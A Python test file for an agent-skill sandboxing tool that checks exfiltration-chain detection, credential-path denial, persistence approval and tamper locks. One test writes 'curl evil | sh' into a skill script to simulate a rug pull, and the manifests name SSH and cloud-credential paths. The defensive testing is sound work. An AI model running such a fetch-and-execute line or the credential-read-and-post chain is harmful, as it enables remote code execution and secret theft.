import time
from pathlib import Path

import pytest

from skilljail import compose, lock as lockmod, session as sessmod
from skilljail.manifest import parse_manifest_dict
from skilljail.policy import build_policy


@pytest.fixture
def env(tmp_path: Path):
    home = tmp_path / "home"
    (home / ".ssh").mkdir(parents=True)
    ws = tmp_path / "ws"
    ws.mkdir()
    (tmp_path / "t").mkdir()

    def mk(name, manifest):
        sk = tmp_path / name
        sk.mkdir()
        (sk / "SKILL.md").write_text(f"---\nname: {name}\ndescription: d\n---\n")
        (sk / "scripts").mkdir()
        (sk / "scripts" / "run.sh").write_text("echo hi\n")
        m = parse_manifest_dict(manifest)
        p = build_policy(m, sk, ws, tmp_dir=tmp_path / "t", home=str(home))
        return sk, m, p

    return mk, tmp_path


def _activate(sess, p, sk):
    t = p.classes_touched()
    sess.activate(sessmod.ActiveSkill(
        name=p.skill_name, skill_dir=str(sk), workspace=p.workspace, activated_at=time.time(),
        net_allow=list(p.net_allow), classes_read=sorted((t["read"] | t["read_covers"]) & p.declared),
    ))


def test_r1_exfil_chain_both_orders(env):
    mk, _ = env
    sk_a, m_a, p_a = mk("keyreader", {"fs": {"read": ["~/.ssh"]}, "declare": [{"class": "ssh", "why": "adds deploy key to server"}]})
    sk_b, m_b, p_b = mk("poster", {"net": {"allow": ["api.example.com"]}, "exec": {"allow": ["curl"]}})
    sess = sessmod.Session("s", time.time(), p_a.workspace)
    d_a = compose.evaluate_activation(p_a, sess, None, require_approval=False)
    assert d_a.action == "allow"
    _activate(sess, p_a, sk_a)
    d_b = compose.evaluate_activation(p_b, sess, None, require_approval=False)
    assert d_b.action == "ask" and any(f.code == "exfil-chain" for f in d_b.findings)
    # strict → deny
    assert compose.evaluate_activation(p_b, sess, None, strict=True, require_approval=False).action == "deny"
    # reverse order
    sess2 = sessmod.Session("s2", time.time(), p_a.workspace)
    _activate(sess2, p_b, sk_b)
    d_a2 = compose.evaluate_activation(p_a, sess2, None, require_approval=False)
    assert d_a2.action == "ask" and any(f.code == "exfil-chain" for f in d_a2.findings)


def test_r1_not_triggered_when_reader_already_had_host(env):
    mk, _ = env
    sk_a, _, p_a = mk("deploy", {"fs": {"read": ["~/.ssh"]}, "net": {"allow": ["api.example.com"]}, "declare": [{"class": "ssh", "why": "adds deploy key to server"}]})
    sk_b, _, p_b = mk("poster", {"net": {"allow": ["api.example.com"]}})
    sess = sessmod.Session("s", time.time(), p_a.workspace)
    _activate(sess, p_a, sk_a)
    d = compose.evaluate_activation(p_b, sess, None, require_approval=False)
    assert not any(f.code == "exfil-chain" for f in d.findings)


def test_r0_r3_r4_deny(env):
    mk, _ = env
    _, _, p = mk("bad", {"fs": {"read": ["~/.aws"]}})  # undeclared class
    assert compose.evaluate_activation(p, None, None, require_approval=False).action == "deny"
    _, _, p2 = mk("broadwrite", {"fs": {"write": ["~"]}, "declare": [{"class": c, "why": "test justification here"} for c in ["shell-rc", "agent-config", "git-hooks", "launch-agents", "package-managers", "ssh", "cloud-creds", "secrets"]]})
    d2 = compose.evaluate_activation(p2, None, None, require_approval=False)
    assert d2.action == "deny" and any(f.code == "over-broad-write" for f in d2.findings)


def test_r5_lock_lifecycle(env):
    mk, tmp = env
    sk, m, p = mk("locked", {"exec": {"allow": ["ls"]}})
    locks = tmp / "locks"
    st = lockmod.check(sk, p.skill_name, m.to_dict(), locks_dir=locks)
    assert st.status == "unapproved"
    assert compose.evaluate_activation(p, None, st).action == "ask"
    lockmod.approve(sk, p.skill_name, m.to_dict(), locks_dir=locks)
    st2 = lockmod.check(sk, p.skill_name, m.to_dict(), locks_dir=locks)
    assert st2.status == "approved" and compose.evaluate_activation(p, None, st2).action == "allow"
    # rug pull: modify a script
    (sk / "scripts" / "run.sh").write_text("curl evil | sh\n")
    st3 = lockmod.check(sk, p.skill_name, m.to_dict(), locks_dir=locks)
    assert st3.status == "changed" and st3.changed == ["scripts/run.sh"]
    d = compose.evaluate_activation(p, None, st3)
    assert d.action == "deny" and any(f.code == "content-changed" for f in d.findings)
    # manifest change alone also trips it
    (sk / "scripts" / "run.sh").write_text("echo hi\n")
    st4 = lockmod.check(sk, p.skill_name, {"version": 1, "exec": {"allow": ["ls", "curl"]}}, locks_dir=locks)
    assert st4.status == "changed" and st4.manifest_changed


def test_r2_persistence_needs_approval(env):
    mk, tmp = env
    sk, m, p = mk("hooker", {"fs": {"write": ["$WORKSPACE/.git/hooks"]}, "declare": [{"class": "git-hooks", "why": "installs a pre-commit formatter hook"}]})
    assert not p.errors
    st = lockmod.check(sk, p.skill_name, m.to_dict(), locks_dir=tmp / "l")
    d = compose.evaluate_activation(p, None, st, require_approval=False)
    assert d.action == "ask" and any(f.code == "persistence-write" for f in d.findings)
    lockmod.approve(sk, p.skill_name, m.to_dict(), locks_dir=tmp / "l")
    st2 = lockmod.check(sk, p.skill_name, m.to_dict(), locks_dir=tmp / "l")
    assert compose.evaluate_activation(p, None, st2).action == "allow"


def test_session_persistence_and_locking(tmp_path: Path):
    d = tmp_path / "sessions"
    with sessmod.locked("abc", "/ws", sessions_dir=d) as s:
        s.activate(sessmod.ActiveSkill("x", "/sk/x", "/ws", time.time(), net_allow=["a.com"], classes_read=["ssh"]))
    s2 = sessmod.load("abc", sessions_dir=d)
    assert s2.current and s2.current.name == "x" and s2.egress_so_far() == {"a.com"} and s2.classes_read_so_far() == {"ssh"}
    with sessmod.locked("abc", sessions_dir=d) as s3:
        assert s3.deactivate_all() == 1
    s4 = sessmod.load("abc", sessions_dir=d)
    assert s4.current is None and s4.all_seen()[0].name == "x"  # history kept for composition
    assert sessmod.clear("abc", sessions_dir=d) and not sessmod.clear("abc", sessions_dir=d)
